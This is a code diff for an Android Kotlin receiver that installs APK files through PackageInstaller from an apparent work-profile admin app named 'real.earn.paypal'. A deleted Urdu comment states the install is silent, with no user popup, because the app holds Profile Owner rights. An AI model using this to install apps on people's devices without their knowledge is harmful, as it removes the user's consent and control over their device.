@@ -1,16 +1,12 @@
 package com.real.earn.paypal.admin
 
+import android.app.PendingIntent // 🟢 یہ ان پورٹ شامل کر دی ہے
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageInstaller
 import android.net.Uri
-import android.os.Build
 import android.util.Log
-import androidx.annotation.RequiresApi
-import java.io.File
-import java.io.FileInputStream
-import java.io.InputStream
 
 class WorkProfileApkInstaller : BroadcastReceiver() {
 
@@ -30,18 +26,15 @@ class WorkProfileApkInstaller : BroadcastReceiver() {
         try {
             val packageInstaller = context.packageManager.packageInstaller
             
-            // سیشن پیرامیٹرز بنائیں
             val params = PackageInstaller.SessionParams(
                 PackageInstaller.SessionParams.MODE_FULL_INSTALL
             ).apply {
                 setAppPackageName(packageName)
             }
 
-            // سیشن بنائیں
             val sessionId = packageInstaller.createSession(params)
             val session = packageInstaller.openSession(sessionId)
 
-            // APK فائل کو سیشن میں اسٹریم کریں
             context.contentResolver.openInputStream(apkUri)?.use { inputStream ->
                 session.openWrite("apk_stream", 0, -1).use { outputStream ->
                     inputStream.copyTo(outputStream)
@@ -49,8 +42,6 @@ class WorkProfileApkInstaller : BroadcastReceiver() {
                 }
             }
 
-            // سیشن کو کمیٹ کریں (خاموش انسٹالیشن)
-            // چونکہ ہم ورک پروفائل میں Profile Owner ہیں، اس لیے کوئی پاپ اپ نہیں آئے گا
             val pendingIntent = PendingIntent.getBroadcast(
                 context,
                 sessionId,
